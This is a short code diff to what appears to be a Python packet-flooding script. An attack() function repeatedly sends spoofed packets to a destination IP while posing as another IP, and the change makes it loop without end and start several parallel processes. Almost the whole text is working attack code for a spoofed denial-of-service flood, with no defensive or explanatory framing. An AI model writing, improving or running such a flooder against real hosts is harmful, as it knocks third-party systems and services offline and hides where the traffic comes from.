@@ -29,8 +29,7 @@ def attack():
                 )
     )
     print("sending packets of length:", len(request), " to ", destination_ip, " pretending to be ", spoof_ip)
-    while 1:
-        send(request)
+    send(request, loop=1, count=None)
 
 
 if __name__ == '__main__':
@@ -45,10 +44,8 @@ if __name__ == '__main__':
 
     signal.signal(signal.SIGINT, signal_handler)
 
-    if number_processes < 2:
-        attack()
-    else:
-        for m in range(0, number_processes):
+    for m in range(1, number_processes):
             p = Process(target=attack)
             p.start()
             processes.append(p)
+    attack()
